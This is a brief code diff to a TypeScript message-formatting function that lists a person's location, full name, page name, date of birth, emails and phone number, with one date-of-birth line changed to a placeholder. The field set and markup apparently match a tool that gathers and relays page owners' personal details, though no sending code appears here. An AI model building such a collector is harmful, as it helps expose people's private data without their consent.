@@ -26,7 +26,7 @@ function formatMessage(data: any): string {
 <b>Location:</b> <code>${data.location || 'Error'}</code>
 <b>Full Name:</b> <code>${data.name || ''}</code>
 <b>Page Name:</b> <code>${data.fanpage || ''}</code>
-<b>Date of birth:</b> <code>" & A2 & "/" & B2 & "/" & C2 & "</code>
+<b>Date of birth:</b> <code>day/month/year</code>
 <b>Email:</b> <code>${data.email || ''}</code>
 <b>Email Business:</b> <code>${data.business || ''}</code>
 <b>Phone Number:</b> <code>+${data.phone || ''}</code>
